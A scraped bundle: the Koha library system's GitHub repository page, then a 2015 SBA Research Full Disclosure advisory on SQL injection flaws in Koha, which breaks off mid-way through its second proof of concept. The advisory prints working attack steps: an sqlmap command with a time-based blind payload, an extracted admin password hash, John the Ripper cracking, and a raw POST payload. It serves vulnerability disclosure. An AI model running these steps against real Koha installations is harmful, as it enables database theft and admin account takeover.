=== Content from github.com_bf4f8438_20250126_050714.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKoha-Community%2FKoha)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKoha-Community%2FKoha)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Koha-Community%2FKoha)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Koha-Community](/Koha-Community)
/
**[Koha](/Koha-Community/Koha)**
Public

* [Notifications](/login?return_to=%2FKoha-Community%2FKoha) You must be signed in to change notification settings
* [Fork
  261](/login?return_to=%2FKoha-Community%2FKoha)
* [Star
   500](/login?return_to=%2FKoha-Community%2FKoha)

Koha is a free software integrated library system (ILS). Koha is distributed under the GNU GPL version 3 or later. \*\*\*Note: this is a synced mirror of the official Koha repo. Note: This project uses its own bug tracker, see <https://bugs.koha-community.org/> to report a bug or submit a patch.

[koha-community.org/](https://koha-community.org/ "https://koha-community.org/")

### License

[GPL-3.0 license](/Koha-Community/Koha/blob/main/LICENSE)

[500
stars](/Koha-Community/Koha/stargazers) [261
forks](/Koha-Community/Koha/forks) [Branches](/Koha-Community/Koha/branches) [Tags](/Koha-Community/Koha/tags) [Activity](/Koha-Community/Koha/activity)
 [Star](/login?return_to=%2FKoha-Community%2FKoha)

 [Notifications](/login?return_to=%2FKoha-Community%2FKoha) You must be signed in to change notification settings

* [Code](/Koha-Community/Koha)
* [Pull requests
  1](/Koha-Community/Koha/pulls)
* [Actions](/Koha-Community/Koha/actions)
* [Projects
  0](/Koha-Community/Koha/projects)
* [Security](/Koha-Community/Koha/security)
* [Insights](/Koha-Community/Koha/pulse)

Additional navigation options

* [Code](/Koha-Community/Koha)
* [Pull requests](/Koha-Community/Koha/pulls)
* [Actions](/Koha-Community/Koha/actions)
* [Projects](/Koha-Community/Koha/projects)
* [Security](/Koha-Community/Koha/security)
* [Insights](/Koha-Community/Koha/pulse)

# Koha-Community/Koha

    main[Branches](/Koha-Community/Koha/branches)[Tags](/Koha-Community/Koha/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[56,389 Commits](/Koha-Community/Koha/commits/main/) | | |
| [C4](/Koha-Community/Koha/tree/main/C4 "C4") | | [C4](/Koha-Community/Koha/tree/main/C4 "C4") |  |  |
| [Koha](/Koha-Community/Koha/tree/main/Koha "Koha") | | [Koha](/Koha-Community/Koha/tree/main/Koha "Koha") |  |  |
| [acqui](/Koha-Community/Koha/tree/main/acqui "acqui") | | [acqui](/Koha-Community/Koha/tree/main/acqui "acqui") |  |  |
| [admin](/Koha-Community/Koha/tree/main/admin "admin") | | [admin](/Koha-Community/Koha/tree/main/admin "admin") |  |  |
| [api](/Koha-Community/Koha/tree/main/api "api") | | [api](/Koha-Community/Koha/tree/main/api "api") |  |  |
| [authorities](/Koha-Community/Koha/tree/main/authorities "authorities") | | [authorities](/Koha-Community/Koha/tree/main/authorities "authorities") |  |  |
| [basket](/Koha-Community/Koha/tree/main/basket "basket") | | [basket](/Koha-Community/Koha/tree/main/basket "basket") |  |  |
| [bin](/Koha-Community/Koha/tree/main/bin "bin") | | [bin](/Koha-Community/Koha/tree/main/bin "bin") |  |  |
| [bookings](/Koha-Community/Koha/tree/main/bookings "bookings") | | [bookings](/Koha-Community/Koha/tree/main/bookings "bookings") |  |  |
| [catalogue](/Koha-Community/Koha/tree/main/catalogue "catalogue") | | [catalogue](/Koha-Community/Koha/tree/main/catalogue "catalogue") |  |  |
| [cataloguing](/Koha-Community/Koha/tree/main/cataloguing "cataloguing") | | [cataloguing](/Koha-Community/Koha/tree/main/cataloguing "cataloguing") |  |  |
| [circ](/Koha-Community/Koha/tree/main/circ "circ") | | [circ](/Koha-Community/Koha/tree/main/circ "circ") |  |  |
| [clubs](/Koha-Community/Koha/tree/main/clubs "clubs") | | [clubs](/Koha-Community/Koha/tree/main/clubs "clubs") |  |  |
| [course\_reserves](/Koha-Community/Koha/tree/main/course_reserves "course_reserves") | | [course\_reserves](/Koha-Community/Koha/tree/main/course_reserves "course_reserves") |  |  |
| [debian](/Koha-Community/Koha/tree/main/debian "debian") | | [debian](/Koha-Community/Koha/tree/main/debian "debian") |  |  |
| [docs](/Koha-Community/Koha/tree/main/docs "docs") | | [docs](/Koha-Community/Koha/tree/main/docs "docs") |  |  |
| [erm](/Koha-Community/Koha/tree/main/erm "erm") | | [erm](/Koha-Community/Koha/tree/main/erm "erm") |  |  |
| [errors](/Koha-Community/Koha/tree/main/errors "errors") | | [errors](/Koha-Community/Koha/tree/main/errors "errors") |  |  |
| [etc](/Koha-Community/Koha/tree/main/etc "etc") | | [etc](/Koha-Community/Koha/tree/main/etc "etc") |  |  |
| [ill](/Koha-Community/Koha/tree/main/ill "ill") | | [ill](/Koha-Community/Koha/tree/main/ill "ill") |  |  |
| [installer](/Koha-Community/Koha/tree/main/installer "installer") | | [installer](/Koha-Community/Koha/tree/main/installer "installer") |  |  |
| [koha-tmpl](/Koha-Community/Koha/tree/main/koha-tmpl "koha-tmpl") | | [koha-tmpl](/Koha-Community/Koha/tree/main/koha-tmpl "koha-tmpl") |  |  |
| [labels](/Koha-Community/Koha/tree/main/labels "labels") | | [labels](/Koha-Community/Koha/tree/main/labels "labels") |  |  |
| [lib](/Koha-Community/Koha/tree/main/lib "lib") | | [lib](/Koha-Community/Koha/tree/main/lib "lib") |  |  |
| [members](/Koha-Community/Koha/tree/main/members "members") | | [members](/Koha-Community/Koha/tree/main/members "members") |  |  |
| [misc](/Koha-Community/Koha/tree/main/misc "misc") | | [misc](/Koha-Community/Koha/tree/main/misc "misc") |  |  |
| [offline\_circ](/Koha-Community/Koha/tree/main/offline_circ "offline_circ") | | [offline\_circ](/Koha-Community/Koha/tree/main/offline_circ "offline_circ") |  |  |
| [opac](/Koha-Community/Koha/tree/main/opac "opac") | | [opac](/Koha-Community/Koha/tree/main/opac "opac") |  |  |
| [patron\_lists](/Koha-Community/Koha/tree/main/patron_lists "patron_lists") | | [patron\_lists](/Koha-Community/Koha/tree/main/patron_lists "patron_lists") |  |  |
| [patroncards](/Koha-Community/Koha/tree/main/patroncards "patroncards") | | [patroncards](/Koha-Community/Koha/tree/main/patroncards "patroncards") |  |  |
| [plugins](/Koha-Community/Koha/tree/main/plugins "plugins") | | [plugins](/Koha-Community/Koha/tree/main/plugins "plugins") |  |  |
| [pos](/Koha-Community/Koha/tree/main/pos "pos") | | [pos](/Koha-Community/Koha/tree/main/pos "pos") |  |  |
| [preservation](/Koha-Community/Koha/tree/main/preservation "preservation") | | [preservation](/Koha-Community/Koha/tree/main/preservation "preservation") |  |  |
| [recalls](/Koha-Community/Koha/tree/main/recalls "recalls") | | [recalls](/Koha-Community/Koha/tree/main/recalls "recalls") |  |  |
| [reports](/Koha-Community/Koha/tree/main/reports "reports") | | [reports](/Koha-Community/Koha/tree/main/reports "reports") |  |  |
| [reserve](/Koha-Community/Koha/tree/main/reserve "reserve") | | [reserve](/Koha-Community/Koha/tree/main/reserve "reserve") |  |  |
| [reviews](/Koha-Community/Koha/tree/main/reviews "reviews") | | [reviews](/Koha-Community/Koha/tree/main/reviews "reviews") |  |  |
| [rotating\_collections](/Koha-Community/Koha/tree/main/rotating_collections "rotating_collections") | | [rotating\_collections](/Koha-Community/Koha/tree/main/rotating_collections "rotating_collections") |  |  |
| [serials](/Koha-Community/Koha/tree/main/serials "serials") | | [serials](/Koha-Community/Koha/tree/main/serials "serials") |  |  |
| [services](/Koha-Community/Koha/tree/main/services "services") | | [services](/Koha-Community/Koha/tree/main/services "services") |  |  |
| [skel](/Koha-Community/Koha/tree/main/skel "skel") | | [skel](/Koha-Community/Koha/tree/main/skel "skel") |  |  |
| [suggestion](/Koha-Community/Koha/tree/main/suggestion "suggestion") | | [suggestion](/Koha-Community/Koha/tree/main/suggestion "suggestion") |  |  |
| [svc](/Koha-Community/Koha/tree/main/svc "svc") | | [svc](/Koha-Community/Koha/tree/main/svc "svc") |  |  |
| [t](/Koha-Community/Koha/tree/main/t "t") | | [t](/Koha-Community/Koha/tree/main/t "t") |  |  |
| [tags](/Koha-Community/Koha/tree/main/tags "tags") | | [tags](/Koha-Community/Koha/tree/main/tags "tags") |  |  |
| [tools](/Koha-Community/Koha/tree/main/tools "tools") | | [tools](/Koha-Community/Koha/tree/main/tools "tools") |  |  |
| [virtualshelves](/Koha-Community/Koha/tree/main/virtualshelves "virtualshelves") | | [virtualshelves](/Koha-Community/Koha/tree/main/virtualshelves "virtualshelves") |  |  |
| [xt](/Koha-Community/Koha/tree/main/xt "xt") | | [xt](/Koha-Community/Koha/tree/main/xt "xt") |  |  |
| [.editorconfig](/Koha-Community/Koha/blob/main/.editorconfig ".editorconfig") | | [.editorconfig](/Koha-Community/Koha/blob/main/.editorconfig ".editorconfig") |  |  |
| [.gitignore](/Koha-Community/Koha/blob/main/.gitignore ".gitignore") | | [.gitignore](/Koha-Community/Koha/blob/main/.gitignore ".gitignore") |  |  |
| [.htaccess](/Koha-Community/Koha/blob/main/.htaccess ".htaccess") | | [.htaccess](/Koha-Community/Koha/blob/main/.htaccess ".htaccess") |  |  |
| [.mailmap](/Koha-Community/Koha/blob/main/.mailmap ".mailmap") | | [.mailmap](/Koha-Community/Koha/blob/main/.mailmap ".mailmap") |  |  |
| [.perlcriticrc](/Koha-Community/Koha/blob/main/.perlcriticrc ".perlcriticrc") | | [.perlcriticrc](/Koha-Community/Koha/blob/main/.perlcriticrc ".perlcriticrc") |  |  |
| [.perltidyrc](/Koha-Community/Koha/blob/main/.perltidyrc ".perltidyrc") | | [.perltidyrc](/Koha-Community/Koha/blob/main/.perltidyrc ".perltidyrc") |  |  |
| [.prettierrc.js](/Koha-Community/Koha/blob/main/.prettierrc.js ".prettierrc.js") | | [.prettierrc.js](/Koha-Community/Koha/blob/main/.prettierrc.js ".prettierrc.js") |  |  |
| [.proverc.dist](/Koha-Community/Koha/blob/main/.proverc.dist ".proverc.dist") | | [.proverc.dist](/Koha-Community/Koha/blob/main/.proverc.dist ".proverc.dist") |  |  |
| [.stylelintrc.json](/Koha-Community/Koha/blob/main/.stylelintrc.json ".stylelintrc.json") | | [.stylelintrc.json](/Koha-Community/Koha/blob/main/.stylelintrc.json ".stylelintrc.json") |  |  |
| [INSTALL](/Koha-Community/Koha/blob/main/INSTALL "INSTALL") | | [INSTALL](/Koha-Community/Koha/blob/main/INSTALL "INSTALL") |  |  |
| [Koha.pm](/Koha-Community/Koha/blob/main/Koha.pm "Koha.pm") | | [Koha.pm](/Koha-Community/Koha/blob/main/Koha.pm "Koha.pm") |  |  |
| [LICENSE](/Koha-Community/Koha/blob/main/LICENSE "LICENSE") | | [LICENSE](/Koha-Community/Koha/blob/main/LICENSE "LICENSE") |  |  |
| [MANIFEST.SKIP](/Koha-Community/Koha/blob/main/MANIFEST.SKIP "MANIFEST.SKIP") | | [MANIFEST.SKIP](/Koha-Community/Koha/blob/main/MANIFEST.SKIP "MANIFEST.SKIP") |  |  |
| [Makefile.PL](/Koha-Community/Koha/blob/main/Makefile.PL "Makefile.PL") | | [Makefile.PL](/Koha-Community/Koha/blob/main/Makefile.PL "Makefile.PL") |  |  |
| [README](/Koha-Community/Koha/blob/main/README "README") | | [README](/Koha-Community/Koha/blob/main/README "README") |  |  |
| [README.md](/Koha-Community/Koha/blob/main/README.md "README.md") | | [README.md](/Koha-Community/Koha/blob/main/README.md "README.md") |  |  |
| [README.robots](/Koha-Community/Koha/blob/main/README.robots "README.robots") | | [README.robots](/Koha-Community/Koha/blob/main/README.robots "README.robots") |  |  |
| [about.pl](/Koha-Community/Koha/blob/main/about.pl "about.pl") | | [about.pl](/Koha-Community/Koha/blob/main/about.pl "about.pl") |  |  |
| [app.psgi](/Koha-Community/Koha/blob/main/app.psgi "app.psgi") | | [app.psgi](/Koha-Community/Koha/blob/main/app.psgi "app.psgi") |  |  |
| [build-resources.PL](/Koha-Community/Koha/blob/main/build-resources.PL "build-resources.PL") | | [build-resources.PL](/Koha-Community/Koha/blob/main/build-resources.PL "build-resources.PL") |  |  |
| [changelanguage.pl](/Koha-Community/Koha/blob/main/changelanguage.pl "changelanguage.pl") | | [changelanguage.pl](/Koha-Community/Koha/blob/main/changelanguage.pl "changelanguage.pl") |  |  |
| [cpanfile](/Koha-Community/Koha/blob/main/cpanfile "cpanfile") | | [cpanfile](/Koha-Community/Koha/blob/main/cpanfile "cpanfile") |  |  |
| [cypress.config.ts](/Koha-Community/Koha/blob/main/cypress.config.ts "cypress.config.ts") | | [cypress.config.ts](/Koha-Community/Koha/blob/main/cypress.config.ts "cypress.config.ts") |  |  |
| [eslint.config.mjs](/Koha-Community/Koha/blob/main/eslint.config.mjs "eslint.config.mjs") | | [eslint.config.mjs](/Koha-Community/Koha/blob/main/eslint.config.mjs "eslint.config.mjs") |  |  |
| [fix-perl-path.PL](/Koha-Community/Koha/blob/main/fix-perl-path.PL "fix-perl-path.PL") | | [fix-perl-path.PL](/Koha-Community/Koha/blob/main/fix-perl-path.PL "fix-perl-path.PL") |  |  |
| [gulpfile.js](/Koha-Community/Koha/blob/main/gulpfile.js "gulpfile.js") | | [gulpfile.js](/Koha-Community/Koha/blob/main/gulpfile.js "gulpfile.js") |  |  |
| [help.pl](/Koha-Community/Koha/blob/main/help.pl "help.pl") | | [help.pl](/Koha-Community/Koha/blob/main/help.pl "help.pl") |  |  |
| [kohaversion.pl](/Koha-Community/Koha/blob/main/kohaversion.pl "kohaversion.pl") | | [kohaversion.pl](/Koha-Community/Koha/blob/main/kohaversion.pl "kohaversion.pl") |  |  |
| [mainpage.pl](/Koha-Community/Koha/blob/main/mainpage.pl "mainpage.pl") | | [mainpage.pl](/Koha-Community/Koha/blob/main/mainpage.pl "mainpage.pl") |  |  |
| [package.json](/Koha-Community/Koha/blob/main/package.json "package.json") | | [package.json](/Koha-Community/Koha/blob/main/package.json "package.json") |  |  |
| [rewrite-config.PL](/Koha-Community/Koha/blob/main/rewrite-config.PL "rewrite-config.PL") | | [rewrite-config.PL](/Koha-Community/Koha/blob/main/rewrite-config.PL "rewrite-config.PL") |  |  |
| [rspack.config.js](/Koha-Community/Koha/blob/main/rspack.config.js "rspack.config.js") | | [rspack.config.js](/Koha-Community/Koha/blob/main/rspack.config.js "rspack.config.js") |  |  |
| [tsconfig.json](/Koha-Community/Koha/blob/main/tsconfig.json "tsconfig.json") | | [tsconfig.json](/Koha-Community/Koha/blob/main/tsconfig.json "tsconfig.json") |  |  |
| [webpack.config.js](/Koha-Community/Koha/blob/main/webpack.config.js "webpack.config.js") | | [webpack.config.js](/Koha-Community/Koha/blob/main/webpack.config.js "webpack.config.js") |  |  |
| [yarn.lock](/Koha-Community/Koha/blob/main/yarn.lock "yarn.lock") | | [yarn.lock](/Koha-Community/Koha/blob/main/yarn.lock "yarn.lock") |  |  |
| View all files | | |

## Repository files navigation

* README
* GPL-3.0 license
## Koha is a free software integrated library system (ILS).

Koha is distributed under the GNU GPL version 3 or later.

**Note:** Koha does not accept pull requests from git hosting sites.

**Note:** This project has its own bug tracker, to report a bug or submit a patch visit <http://bugs.koha-community.org>.

For guidelines on submitting patches for Koha please visit <https://wiki.koha-community.org/wiki/SubmitingAPatch>

The developers handbook can be found at <https://wiki.koha-community.org/wiki/Developer_handbook>

<http://koha-community.org/>

[![Koha Logo](https://camo.githubusercontent.com/ae0c980423d1031ba42a5b748da980f6fbb52f3aad57da363d30cc5e2175a0ba/68747470733a2f2f77696b692e6b6f68612d636f6d6d756e6974792e6f72672f772f696d616765732f4b6f6861494c532e706e67)](https://camo.githubusercontent.com/ae0c980423d1031ba42a5b748da980f6fbb52f3aad57da363d30cc5e2175a0ba/68747470733a2f2f77696b692e6b6f68612d636f6d6d756e6974792e6f72672f772f696d616765732f4b6f6861494c532e706e67)

## About

Koha is a free software integrated library system (ILS). Koha is distributed under the GNU GPL version 3 or later. \*\*\*Note: this is a synced mirror of the official Koha repo. Note: This project uses its own bug tracker, see <https://bugs.koha-community.org/> to report a bug or submit a patch.

[koha-community.org/](https://koha-community.org/ "https://koha-community.org/")

### Resources

[Readme](#readme-ov-file)
### License

[GPL-3.0 license](#GPL-3.0-1-ov-file)

[Activity](/Koha-Community/Koha/activity)
[Custom properties](/Koha-Community/Koha/custom-properties)
### Stars

[**500**
stars](/Koha-Community/Koha/stargazers)
### Watchers

[**73**
watching](/Koha-Community/Koha/watchers)
### Forks

[**261**
forks](/Koha-Community/Koha/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FKoha-Community%2FKoha&report=Koha-Community+%28user%29)

## [Releases](/Koha-Community/Koha/releases)

[627
tags](/Koha-Community/Koha/tags)

## [Packages 0](/orgs/Koha-Community/packages?repo_name=Koha)

No packages published

## [Contributors 300](/Koha-Community/Koha/graphs/contributors)

* [![@joubu](https://avatars.githubusercontent.com/u/671757?s=64&v=4)](https://github.com/joubu)
* [![@oleonard](https://avatars.githubusercontent.com/u/3648783?s=64&v=4)](https://github.com/oleonard)
* [![@tomascohen](https://avatars.githubusercontent.com/u/739507?s=64&v=4)](https://github.com/tomascohen)
* [![@mrenvoize](https://avatars.githubusercontent.com/u/557612?s=64&v=4)](https://github.com/mrenvoize)
* [![@kidclamp](https://avatars.githubusercontent.com/u/9055940?s=64&v=4)](https://github.com/kidclamp)
* [![@kylemhall](https://avatars.githubusercontent.com/u/50537?s=64&v=4)](https://github.com/kylemhall)
* [![@mderooy](https://avatars.githubusercontent.com/u/5469372?s=64&v=4)](https://github.com/mderooy)
* [![@kfischer](https://avatars.githubusercontent.com/u/425526?s=64&v=4)](https://github.com/kfischer)
* [![@ranginui](https://avatars.githubusercontent.com/u/42249?s=64&v=4)](https://github.com/ranginui)
* [![@gmcharlt](https://avatars.githubusercontent.com/u/89542?s=64&v=4)](https://github.com/gmcharlt)
* [![@PaulPoulain](https://avatars.githubusercontent.com/u/4696271?s=64&v=4)](https://github.com/PaulPoulain)
* [![@jcamins](https://avatars.githubusercontent.com/u/238226?s=64&v=4)](https://github.com/jcamins)
* [![@jajm](https://avatars.githubusercontent.com/u/306836?s=64&v=4)](https://github.com/jajm)
* [![@fridobox](https://avatars.githubusercontent.com/u/30493086?s=64&v=4)](https://github.com/fridobox)

[+ 286 contributors](/Koha-Community/Koha/graphs/contributors)

## Languages

* [Perl
  58.7%](/Koha-Community/Koha/search?l=perl)
* [JavaScript
  22.9%](/Koha-Community/Koha/search?l=javascript)
* [HTML
  8.5%](/Koha-Community/Koha/search?l=html)
* [XSLT
  4.6%](/Koha-Community/Koha/search?l=xslt)
* [Vue
  1.7%](/Koha-Community/Koha/search?l=vue)
* [SCSS
  1.1%](/Koha-Community/Koha/search?l=scss)
* Other
  2.5%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from seclists.org_b7eccf22_20250125_014244.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](79)
[By Date](date.html#80)
[![Next](/images/right-icon-16x16.png)](81)

[![Previous](/images/left-icon-16x16.png)](79)
[By Thread](index.html#80)
[![Next](/images/right-icon-16x16.png)](81)

![](/shared/images/nst-icons.svg#search)

# SBA Research Vulnerability Disclosure - Multiple Critical Vulnerabilities in Koha ILS

---

*From*: Raschin Ghanad-Tavakoli <RGhanad-Tavakoli () sba-research org>

*Date*: Thu, 25 Jun 2015 17:01:01 +0000

---

```
===============================================================================================
SBA Research Vulnerability Disclosure
===============================================================================================

title:                          Koha Unauthenticated SQL injection
product:                        Koha ILS
affected version:       3.20.x <= 3.20.1, 3.18.x <= 3.18.8, 3.16.x <= 3.16.12
fixed version:          3.20.1, 3.17.8, 3.16.12
CVE numbers:    CVE-2015-4633, CVE-2015-4632, CVE-2015-4631
impact:                 critical
website:                        <http://www.koha-community.org/>

found by:                       Raschin Tavakoli / SBA Research Combinatorial Security Testing Group
contact:                        cst () sba-research org

References:             <http://koha-community.org/security-release-koha-3-20-1/>
                                <http://koha-community.org/security-release-koha-3-18-8/>
                                <http://koha-community.org/security-release-koha-3-16-12/>

                                <http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14412>
                                <http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14408>
                                <http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14426>
                                <http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14416>
                                <http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14418>
                                ​<http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14423>

===============================================================================================

=========================
1. Mutiple SQL Injections
=========================

+ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ +
+ a) Unauthenticated SQL Injection in OPAC interface (CVE-2015-4633)   +
+ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ +

Vulnerability:
--------------
The url parameter 'number' in /cgi-bin/koha/opac-tags_subject.pl is vulnerable to SQLI.

Impact:
-------
By injecting malicious sql code a remote attacker can access the database and read arbritary data. If the webserver is
misconfigured, the file-system may be accessed as well.

References:
-----------
<http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14412>

# ################################################################################################## #
# PoC:                                                                                               #
# ################################################################################################## #
1. Inspect Koha database schema

   Have a look at how to query the database for superlibrarian users:
   <http://wiki.koha-community.org/wiki/SQL_Reports_Library#Superlibrarians>

   So basically we we need to execute some SQL statement like this:
   sql-shell> select userid, password from borrowers where flags=1 and password is not null order by borrowernumber
desc limit 1;

2. Query the database with sqlmap

   So let's fire up sqlmap with the --sql-shell parameter and input the query:

   root@kali:/home/wicked# sqlmap -u <http://testbox:9001/cgi-bin/koha/opac-tags_subject.pl?number=10> -p number
--technique=T --dbms=MySQL --sql-shell --time-sec=4
         _
    ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150513}
   |_ -| . | |     | .'| . |
   |___|_  |_|_|_|_|__,|  _|
         |_|           |_|   <http://sqlmap.org>

   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end
user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not
responsible for any misuse or damage caused by this program

   [*] starting at 09:20:07

   [09:20:07] [INFO] testing connection to the target URL
   sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
   ---
   Parameter: number (GET)
       Type: AND/OR time-based blind
       Title: MySQL >= 5.1 time-based blind - PROCEDURE ANALYSE (EXTRACTVALUE)
       Payload: number=1 PROCEDURE ANALYSE(EXTRACTVALUE(9743,CONCAT(0x5c,(BENCHMARK(4000000,MD5(0x4b754a4b))))),1)
   ---
   [09:20:09] [INFO] testing MySQL
   [09:20:09] [INFO] confirming MySQL
   [09:20:09] [INFO] the back-end DBMS is MySQL
   web server operating system: Linux Debian
   web application technology: Apache 2.4.10
   back-end DBMS: MySQL >= 5.0.0
   [09:20:09] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER

   sql-shell> select userid, password from borrowers where flags=1 and password is not null order by borrowernumber
desc limit 1;
   [09:20:25] [INFO] fetching SQL SELECT statement query output: 'select userid, password from borrowers where flags=1
and password is not null order by borrowernumber desc limit 1'
   [09:20:25] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to
be able to retrieve the output even if we are going blind
   [09:20:25] [WARNING] time-based comparison requires larger statistical model, please
wait..............................
   [09:20:52] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to
prevent potential errors
   admin
   [09:21:46] [INFO] retrieved: $2a$08$taQ
   [09:23:33] [ERROR] invalid character detected. retrying..
   [09:23:33] [WARNING] increasing time delay to 5 seconds
   afOgEEhU
   [09:25:10] [ERROR] invalid character detected. retrying..
   [09:25:10] [WARNING] increasing time delay to 6 seconds
   t/gW
   [09:26:13] [ERROR] invalid character detected. retrying..
   [09:26:13] [WARNING] increasing time delay to 7 seconds
   TOmqnYe1Y6ZNxCENa
   [09:29:57] [ERROR] invalid character detected. retrying..
   [09:29:57] [WARNING] increasing time delay to 8 seconds
   2.ONk2eZhnuEw5z9OjjxS
   [09:35:08] [ERROR] invalid character detected. retrying..
   [09:35:08] [WARNING] increasing time delay to 9 seconds

   select userid, password from borrowers where flags=1 and password is not null order by borrowernumber desc limit 1;:

   'admin, $2a$08$taQafOgEEhUt/gWTOmqnYe1Y6ZNxCENa2.ONk2eZhnuEw5z9OjjxS'

3. Feed john the ripper and be lucky

   root@kali:/home/wicked# echo "$2a$08$taQafOgEEhUt/gWTOmqnYe1Y6ZNxCENa2.ONk2eZhnuEw5z9OjjxS" > ./admin-pass
   root@kali:/home/wicked# john ./admin-pass
   Loaded 1 password hash (OpenBSD Blowfish [32/64 X2])
   admin            (?)
   guesses: 1  time: 0:00:00:10 DONE (Thu Jun 25 09:45:41 2015)  c/s: 260  trying: Smokey - allstate
   Use the "--show" option to display all of the cracked passwords reliably

   root@kali:/home/wicked# john ./admin-pass --show
   ?:admin

   1 password hash cracked, 0 left

4. Log in with username "admin" and password "admin" ;)

# ################################################################################################## #
# PoC End                                                                                            #
# ################################################################################################## #

+ +++++++++++++++++++++++++++++++++++ +
+ b) SQL Injection in STAFF interface +
+ +++++++++++++++++++++++++++++++++++ +

Vulnerability:
--------------
An SQL Injection vulnerability exists in /cgi-bin/koha/reports/borrowers_out.pl allows remote attacker's to read
arbritrary data via the database due to improper input validation of the parameters Filter and Criteria.

Impact:
-------
By injection malicious sql a remote attacker can read arbitrary data from the database. If the webserver is
misconfigured, read & write access to the filesystem may be possible.

References:
-----------
<http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14426>

# ################################################################################################## #
# PoC:                                                                                               #
# ################################################################################################## #

====================================================================
1. "Criteria" Parameter, Payload: ELT(1=1,'evil') / ELT(1=2,'evil')
====================================================================

echo -ne "POST /cgi-bin/koha/reports/borrowers_out.pl HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
